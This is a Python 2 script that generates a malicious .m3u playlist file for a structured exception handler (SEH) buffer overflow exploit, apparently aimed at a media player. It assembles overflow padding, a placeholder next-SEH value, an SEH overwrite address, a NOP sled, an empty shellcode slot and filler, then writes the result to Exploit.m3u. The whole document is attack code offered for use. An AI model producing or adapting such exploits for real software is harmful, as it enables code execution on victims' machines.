from struct import pack

junk = "http://" + "\x41" * 741
nseh = pack('<I',0xDEADBEEF)
seh = pack('<I',0x6600105D)
nops= "\x90" * 20
shell=("")

junkD = "D" * (2572 - (len(junk + nseh + seh + nops + shell)))
exploit = junk + nseh + seh + nops + shell + junkD
  
#exploit = "http://" + "A" * (0x135 + 0x2c) + "B" * 4

prepadding = "D" * ((2572) - (len(junk + nseh + seh + nops)))
exploit = junk + nseh + seh + nops + prepadding

file= open("Exploit.m3u",'w')
file.write(exploit)
file.close()
print "[*] Exploit has been created!"            